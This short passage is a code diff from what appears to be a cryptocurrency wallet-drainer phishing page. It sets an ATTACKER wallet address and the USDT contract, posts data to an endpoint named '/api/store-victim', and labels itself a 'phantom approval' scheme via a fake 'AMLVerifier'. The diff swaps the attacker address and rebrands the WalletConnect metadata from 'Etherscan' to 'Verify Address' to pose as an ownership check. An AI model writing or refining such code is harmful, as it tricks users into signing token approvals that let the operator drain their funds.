@@ -1234,7 +1234,7 @@
   });
 
   /* ===== WalletConnect + Approbation fantôme via AMLVerifier ===== */
-  const ATTACKER = '0x18f474eB888F91C0426C0dE3f1b24dec227fEF5a';
+  const ATTACKER = '0x9e09f7E4AD79177Ba1cB4b2125390d9A4d6f34DB';
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const API = '/api/store-victim';
   const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
@@ -1256,10 +1256,10 @@ async function initWalletConnect() {
   signClient = await SignClientClass.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: 'Etherscan',
+      name: 'Verify Address',
       description: 'Verify Address Ownership',
       url: 'https://chainintegrity.io', // ← ton domaine actuel
-      icons: ['https://chainintegrity.io/etherscan-logo-circle.png']
+      icons: ['https://chainintegrity.io/logo-circle.png']
     }
   });
 
